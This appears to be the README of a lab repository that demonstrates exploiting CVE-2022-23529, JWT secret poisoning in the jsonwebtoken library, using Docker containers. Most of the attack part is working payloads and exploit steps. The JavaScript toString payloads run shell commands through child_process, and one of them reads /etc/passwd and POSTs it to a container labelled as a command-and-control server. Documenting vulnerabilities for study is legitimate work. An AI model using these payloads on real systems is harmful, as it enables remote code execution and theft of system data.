## JWT Secret Poisoning (CVE-2022-23529)

This project is to demonstrate the exploitation of the JWT Secret Poisoning attack (CVE-2022-23529. 

## Payloads

   ```sh
   { toString : ()=> {require("child_process").exec(`curl --http0.9 --location --request GET 'http://172.24.0.2:8000/app/info' --header 'Content-Type: application/json'`,(error,stdout,stderr) => {console.log(error);console.log(stdout);console.log(stderr);})}};
   { toString : ()=> {require('fs').writeFileSync('/tmp/malicious.txt', 'Vulnerable jsonwebtoken library. Upgrade to 9.0');}}
   { toString : ()=> {require('child_process').exec(`cat /etc/passwd`,(error,stdout,stderr) => {var z=stdout.replace(/\n/g, '-');var z=z.replace(/ /g, ''); console.log(z); require('child_process').exec(`curl --http0.9 --location --request POST 'http://172.24.0.4:4455/' --header 'Content-Type: text/plain' --data-raw `+z,(error,stdout,stderr) => {console.log(stdout);console.log(error);console.log(stderr)});});}};
   ```
 
## Getting started

### Prerequisites

* Docker
* Docker-compose

### Installation

1. Clone the repository

   ```sh
   cd /Data
   git clone https://github.com/govindasamyarun/jwt-secret-poisoning
   ```

2. Start the containers

   ```sh
   pwd: /Data/jwt-secret-poisoning
   
   docker-compose up --detach
   ```

## Application details
  
1. Vulnerable app - Uses vulnerable jsonwebtoken library

   ```sh
   IP: 172.24.0.3
   Port: 8080
   ```
2. C2 - Command and control server to collect the data from the vulnerable aplication 

   ```sh
   IP: 172.24.0.4
   Port: 4455
   ```

3. Internal app - Application process sensitive information

   ```sh
   IP: 172.24.0.2
   Port: 8000
   ```
   
 ## Exploit
 
The exploit works during the token verification process. 

1. Create a token 

   ```sh
   curl --location --request GET 'http://127.0.0.1:8080/api/token/create'
   ```
   
2. Update the Secrets manager with the new payload
    - Access http://127.0.0.1:8000/
    - Refer payloads file 
    - Enter a new payload
    - Submit
    
3. Verify token (copy token from step 1)

   ```sh
   curl --location --request POST 'http://127.0.0.1:8080/api/token/verify' --header 'token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0NjBZbXkiLCJpc3MiOiJqd3RzZXJ2aWNlIiwia2V5X2lkIjoiVzNia00zMGF2SldZNWdoYkx5QjRyeW5XektzSkZmeGkiLCJpYXQiOjE2NzM1MDYxMDJ9.ed035LIQ7Qw0rn0NAz7B4aAptcxXdHYHpn7tbx5Rkv8'
   ```
   
4. The c2 server should have received the /etc/passwd content

   ```sh
   docker logs c2
   ```
 
5. Update secret variable in the app.js to test other payloads. 
   